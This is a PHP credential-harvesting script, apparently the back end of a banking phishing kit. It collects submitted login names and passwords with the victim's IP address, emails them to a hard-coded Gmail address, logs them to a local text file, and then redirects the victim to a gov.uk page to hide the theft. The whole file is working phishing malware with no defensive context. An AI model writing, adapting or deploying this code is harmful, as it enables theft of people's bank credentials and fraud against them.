 <?php
error_reporting(0);
session_start();

if(count($_POST) > 0)
{
  $body = '';
  $subject = "Home Banking Result - $_SERVER[REMOTE_ADDR]";
  $full = false;

  if(isset($_POST['undefined1']) && isset($_POST['undefined2']))
  {
    $body .= "-------------- Login Info --------------\n";
    $body .= "Login : $_POST[undefined1]\n";
    $body .= "Pass         : $_POST[undefined2]\n";
    $body .= "------------------------------------------\n";
    $subject .= " - Login";

    $_SESSION['undefined1'] = $_POST['undefined1'];
    $_SESSION['undefined2'] = $_POST['undefined2'];
  }

  $body .=   "IP Adresse    : $_SERVER[REMOTE_ADDR]\n";
  $body .= "-----------------------------------------\n";

  mail("zabiraid@gmail.com",$subject,$body);
  $fp = fopen('MyResult.txt','a');
  fwrite($fp,$body);
  fclose($fp);
$full = true;
  if($full)
  {
    session_destroy();
    header("Location: https://www.gov.uk/search/news-and-communications");
  }
}
?>
